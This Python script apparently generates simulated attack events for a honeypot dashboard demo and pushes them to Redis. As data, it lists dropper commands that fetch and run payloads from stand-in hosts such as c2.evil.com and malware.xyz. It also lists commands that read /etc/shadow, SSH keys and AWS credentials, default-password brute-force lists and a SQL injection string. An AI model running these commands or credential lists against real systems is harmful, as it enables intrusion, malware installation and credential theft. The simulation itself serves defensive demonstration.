#!/usr/bin/env python3
"""
HoneypotAI — Attack Simulator
Generates realistic diverse attacks replacing the preloaded dataset.
Run: python3 simulate_attacks.py          # full simulation
Run: python3 simulate_attacks.py --fast   # instant
Run: python3 simulate_attacks.py --loop   # keep running forever (live demo mode)
"""
import json, time, random, datetime, sys, os

def get_redis():
    import os
    url = os.environ.get("RENDER_REDIS_URL","") or os.environ.get("REDIS_URL","")
    if url:
        try:
            import redis
            r = redis.from_url(url, decode_responses=True, ssl_cert_reqs=None)
            r.ping(); print(f"[Sim] Redis via URL"); return r
        except: pass
    import redis
    for port in [6380, 6379]:
        try:
            r = redis.Redis(host='127.0.0.1', port=port, db=0, decode_responses=True)
            r.ping(); print(f"[Sim] Redis port {port}"); return r
        except: continue
    print("[Sim] No Redis"); sys.exit(1)

r = get_redis()

ATTACKERS = [
    {"ip":"218.92.0.187",  "country":"China",       "lat":35.86,"lon":104.19,"geo":0.95},
    {"ip":"101.71.38.26",  "country":"China",       "lat":31.23,"lon":121.47,"geo":0.95},
    {"ip":"222.186.61.34", "country":"China",       "lat":39.90,"lon":116.41,"geo":0.95},
    {"ip":"58.218.211.14", "country":"China",       "lat":30.27,"lon":120.15,"geo":0.95},
    {"ip":"185.220.101.45","country":"Russia",      "lat":55.75,"lon":37.62, "geo":0.90},
    {"ip":"194.165.16.78", "country":"Russia",      "lat":59.94,"lon":30.32, "geo":0.90},
    {"ip":"91.108.4.113",  "country":"Russia",      "lat":53.20,"lon":50.15, "geo":0.90},
    {"ip":"146.185.243.61","country":"Ukraine",     "lat":50.45,"lon":30.52, "geo":0.80},
    {"ip":"185.244.25.10", "country":"Ukraine",     "lat":46.97,"lon":31.99, "geo":0.80},
    {"ip":"185.220.101.6", "country":"Iran",        "lat":35.69,"lon":51.42, "geo":0.85},
    {"ip":"94.102.49.190", "country":"Iran",        "lat":32.66,"lon":51.68, "geo":0.85},
    {"ip":"177.82.214.30", "country":"Brazil",      "lat":-23.55,"lon":-46.63,"geo":0.60},
    {"ip":"189.112.49.83", "country":"Brazil",      "lat":-12.97,"lon":-38.50,"geo":0.60},
    {"ip":"103.75.190.10", "country":"Vietnam",     "lat":21.02,"lon":105.83,"geo":0.70},
    {"ip":"118.68.171.22", "country":"Vietnam",     "lat":10.82,"lon":106.63,"geo":0.70},
    {"ip":"89.238.187.45", "country":"Romania",     "lat":44.43,"lon":26.10, "geo":0.65},
    {"ip":"41.203.69.90",  "country":"Nigeria",     "lat":6.45, "lon":3.47,  "geo":0.70},
    {"ip":"185.220.101.87","country":"Netherlands", "lat":52.37,"lon":4.90,  "geo":0.45},
    {"ip":"198.199.90.155","country":"United States","lat":37.77,"lon":-122.41,"geo":0.40},
    {"ip":"103.21.58.192", "country":"India",       "lat":28.61,"lon":77.21, "geo":0.55},
    {"ip":"45.142.212.100","country":"Germany",     "lat":52.52,"lon":13.40, "geo":0.35},
    {"ip":"164.90.145.73", "country":"Singapore",   "lat":1.35, "lon":103.82,"geo":0.50},
    {"ip":"2.57.122.55",   "country":"Pakistan",    "lat":33.72,"lon":73.06, "geo":0.60},
    {"ip":"177.67.80.4",   "country":"Brazil",      "lat":-15.78,"lon":-47.93,"geo":0.60},
    {"ip":"5.188.206.14",  "country":"Russia",      "lat":57.15,"lon":65.53, "geo":0.90},
]

SCAN_CREDS = [("root",""),("admin",""),("test",""),("ubuntu","")]
BRUTE_CREDS = [
    ("root","123456"),("root","password"),("admin","admin"),("root","root"),
    ("ubuntu","ubuntu"),("pi","raspberry"),("root","toor"),("admin","12345"),
    ("user","user"),("root","alpine"),("admin","password123"),("root","pass"),
    ("guest","guest"),("root","1234"),("admin","1234"),("root","qwerty"),
    ("postgres","postgres"),("oracle","oracle"),("tomcat","tomcat"),
]
EXPLOIT_CREDS = [("root","xc3511"),("admin","admin123"),("root","vizxv")]
EXPLOIT_CMDS = [
    "uname -a","ls -la","cat /etc/passwd","find / -perm -4000 2>/dev/null",
    "netstat -an","ps aux","whoami","id","cat /proc/version",
    "cat /etc/os-release","ifconfig","ip addr","hostname",
]
DROPPER_CREDS = [("root","xc3511"),("root","vizxv"),("admin","admin")]
DROPPER_CMDS = [
    "uname -a",
    "wget http://195.2.253.159/bot.sh -O /tmp/bot.sh",
    "curl http://malware.xyz/payload -o /tmp/payload",
    "chmod +x /tmp/bot.sh",
    "/tmp/bot.sh &",
    "rm -rf /tmp/bot.sh",
]
APT_CREDS = [
    ("root","NexaDB@2024"),("admin","NexaCorp99#Root"),
    ("r.menon","NexaCorp2024!"),
]
APT_CMDS = [
    "uname -a","id","cat /etc/passwd","cat /etc/shadow",
    "find / -perm -4000 2>/dev/null",
    "cat /home/admin/passwords.txt",
    "cat /home/admin/.aws/credentials",
    "ls -la /home/admin/",
    "cat .bash_history","ip addr","netstat -tulpn",
    "cat /home/admin/id_rsa",
    "cat /var/www/html/config.php",
    "mysql -u root -pNexaDB@2024 -e \"show databases;\"",
    "wget http://c2.evil.com/shell -O /tmp/.x",
    "chmod +x /tmp/.x && /tmp/.x",
]
WEB_EVENTS = [
    ("PAGE_VISIT",  "WEB_HONEYPOT", "GET /"),
    ("PAGE_VISIT",  "WEB_HONEYPOT", "GET /about"),
    ("PAGE_VISIT",  "WEB_HONEYPOT", "GET /careers"),
    ("ROBOTS_TXT",  "WEB_HONEYPOT", "Scraped robots.txt"),
    ("LOGIN_ATTEMPT","WEB_HONEYPOT","user=admin@nexacorp.com pass=admin123"),
    ("LOGIN_ATTEMPT","WEB_HONEYPOT","user=r.menon@nexacorp.com pass=NexaCorp2024"),
    ("ADMIN_ACCESS","WEB_HONEYPOT", "Accessed /admin"),
    ("API_PROBE",   "WEB_HONEYPOT", "GET /api/v1/users"),
    ("SENSITIVE_PATH_PROBE","WEB_HONEYPOT","Probed /.env"),
    ("GIT_PROBE",   "WEB_HONEYPOT", "Accessed /.git/config"),
    ("HONEYTOKEN_ACCESS","WEB_HONEYPOT","Downloaded: passwords.txt"),
    ("HONEYTOKEN_ACCESS","WEB_HONEYPOT","Downloaded: id_rsa"),
    ("SQL_INJECTION_ATTEMPT","WEB_HONEYPOT","SQLi: user=admin' OR 1=1--"),
    ("VPN_PAGE_ACCESS","WEB_HONEYPOT","Accessed /vpn"),
    ("FILE_SERVER_ACCESS","WEB_HONEYPOT","Accessed /files"),
    ("SSO_PROBE",   "WEB_HONEYPOT", "SSO bypass attempt /sso/microsoft"),
]

def ev(ip, service, etype, data, ts_offset_seconds=0):
    ts = datetime.datetime.utcnow() - datetime.timedelta(seconds=ts_offset_seconds)
    event = {
        "timestamp": ts.isoformat(),
        "ip": ip, "port": 22 if service=="SSH" else 8888,
        "service": service, "event_type": etype, "data": data,
    }
    r.lpush("honeypot:events", json.dumps(event))
    r.ltrim("honeypot:events", 0, 99999)

def simulate_one(attacker, atype, fast=False, ts_offset=0):
    ip  = attacker["ip"]
    d   = 0 if fast else random.uniform(0.05, 0.3)

    if atype == "SCANNER":
        ev(ip,"SSH","connection",f"New connection from {ip}",ts_offset)
        for u,p in random.sample(SCAN_CREDS, min(2,len(SCAN_CREDS))):
            ev(ip,"SSH","LOGIN_ATTEMPT",f"user={u} pass={p}",ts_offset)
            time.sleep(d)

    elif atype == "BRUTEFORCE":
        ev(ip,"SSH","connection",f"New connection from {ip}",ts_offset)
        creds = random.sample(BRUTE_CREDS, random.randint(8,15))
        for u,p in creds:
            ev(ip,"SSH","LOGIN_ATTEMPT",f"user={u} pass={p}",ts_offset)
            time.sleep(d*0.3)

    elif atype == "EXPLOITER":
        ev(ip,"SSH","connection",f"New connection from {ip}",ts_offset)
        for u,p in EXPLOIT_CREDS[:1]:
            ev(ip,"SSH","LOGIN_ATTEMPT",f"user={u} pass={p}",ts_offset)
        for cmd in random.sample(EXPLOIT_CMDS, random.randint(5,10)):
            ev(ip,"SSH","CMD",cmd,ts_offset)
            time.sleep(d)

    elif atype == "DROPPER":
        ev(ip,"SSH","connection",f"New connection from {ip}",ts_offset)
        for u,p in DROPPER_CREDS[:1]:
            ev(ip,"SSH","LOGIN_ATTEMPT",f"user={u} pass={p}",ts_offset)
        for cmd in DROPPER_CMDS:
            ev(ip,"SSH","CMD",cmd,ts_offset)
            time.sleep(d*0.5)
        ev(ip,"SSH","file_download",f"http://malware.xyz/payload",ts_offset)

    elif atype in ["PERSISTENT","APT"]:
        for session in range(random.randint(3,6)):
            ev(ip,"SSH","connection",f"Session {session+1} from {ip}",ts_offset)
            for u,p in APT_CREDS[:1]:
                ev(ip,"SSH","LOGIN_ATTEMPT",f"user={u} pass={p}",ts_offset)
            cmds = APT_CMDS if atype=="APT" else EXPLOIT_CMDS
            for cmd in random.sample(cmds, min(len(cmds), random.randint(5,12))):
                ev(ip,"SSH","CMD",cmd,ts_offset)
                time.sleep(d*0.2)

    # Most attackers also probe the web
    if random.random() > 0.4:
        web_picks = random.sample(WEB_EVENTS, random.randint(3,8))
        for etype, svc, data in web_picks:
            ev(ip, svc, etype, data, ts_offset)
            time.sleep(d*0.1)

    print(f"  [{atype}] {ip} ({attacker['country']})")

def run_full(fast=False, loop=False):
    types = ["SCANNER","BRUTEFORCE","EXPLOITER","DROPPER","PERSISTENT","APT"]

    print("=" * 60)
    print("  HoneypotAI Attack Simulator")
    print("  Generating diverse realistic attacks from 25 global IPs")
    if loop: print("  LOOP MODE — running forever (Ctrl+C to stop)")
    print("=" * 60)

    iteration = 0
    while True:
        iteration += 1
        total = 0
        # Spread over last 24 hours for realistic timeline
        ts_offsets = list(range(0, 86400, 3600))

        for atype in types:
            count = {"SCANNER":5,"BRUTEFORCE":4,"EXPLOITER":3,"DROPPER":2,"PERSISTENT":2,"APT":2}[atype]
            selected = random.sample(ATTACKERS, min(count, len(ATTACKERS)))
            for i, atk in enumerate(selected):
                offset = ts_offsets[total % len(ts_offsets)]
                simulate_one(atk, atype, fast=fast, ts_offset=offset)
                total += 1
                if not fast: time.sleep(random.uniform(0.2, 0.8))

        print(f"\n✅ Iteration {iteration} — {total} attacker sessions, {r.llen('honeypot:events'):,} total in Redis")

        if not loop:
            print("Run with --loop to keep generating continuously.")
            break
        else:
            wait = 30 if fast else 120
            print(f"Waiting {wait}s before next batch...")
            time.sleep(wait)

if __name__ == "__main__":
    fast = "--fast" in sys.argv
    loop = "--loop" in sys.argv
    run_full(fast=fast, loop=loop)
